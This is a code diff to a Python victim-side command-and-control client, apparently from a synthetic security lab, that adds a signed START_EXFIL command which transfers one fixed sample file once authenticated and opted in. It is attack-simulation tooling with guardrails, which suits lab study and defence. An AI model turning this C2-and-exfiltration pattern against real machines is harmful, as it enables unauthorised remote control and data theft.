@@ -1,8 +1,9 @@
 """Victim-side one-command C2 client for the synthetic lab.
 
 Run on victim after Kali server is listening: python3 -m victim.c2_client
-With --enable-synthetic-actions, a signed START_ENCRYPT runs the existing
-copy-only containment trial. All other commands remain dry-run.
+With --enable-synthetic-actions, signed START_ENCRYPT runs the copy-only
+containment trial and signed START_EXFIL transfers one fixed synthetic sample.
+Other commands remain dry-run.
 """
 
 import argparse
@@ -69,6 +70,31 @@ def receive_once(*, enable_synthetic_actions=False):
                 connection.sendall(pack("REJECT", signed=True, data={"reason": reason}))
                 print(f"REJECT: {reason}")
             return
+        if command == "START_EXFIL" and enable_synthetic_actions:
+            if not AUTH_MODE or not message["authenticated"]:
+                reason = "Synthetic actions require authenticated C2"
+                log_event("command_rejected", role="victim", cmd=command, reason=reason)
+                connection.sendall(pack("REJECT", signed=AUTH_MODE, data={"reason": reason}))
+                print(f"REJECT: {reason}")
+                return
+            sample = "01_Operations/report.pdf"
+            try:
+                from victim.transfer_sender import send_file
+                send_file(sample)  # send_file enforces its own fixed synthetic allowlist.
+                log_event("synthetic_action_completed", role="victim", cmd=command,
+                          file=sample)
+                connection.sendall(pack("ACK", signed=True,
+                                        data={"cmd": command, "executed": True,
+                                              "file": sample}))
+                print(f"ACK: controlled encrypted transfer completed for {sample}")
+            except (OSError, ValueError, RuntimeError) as exc:
+                reason = f"Controlled transfer failed: {str(exc)[:160]}"
+                log_event("synthetic_action_failed", role="victim", cmd=command,
+                          reason=reason)
+                connection.sendall(pack("REJECT", signed=True,
+                                        data={"reason": reason}))
+                print(f"REJECT: {reason}")
+            return
         connection.sendall(pack("ACK", signed=AUTH_MODE, data={"cmd": command, "executed": False}))
         print(f"ACK: {command} accepted (dry run; no action executed)")
 
@@ -76,6 +102,6 @@ def receive_once(*, enable_synthetic_actions=False):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--enable-synthetic-actions", action="store_true",
-                        help="Allow signed START_ENCRYPT to run the copy-only containment trial")
+                        help="Allow signed START_ENCRYPT and START_EXFIL on synthetic samples")
     args = parser.parse_args()
     receive_once(enable_synthetic_actions=args.enable_synthetic_actions)
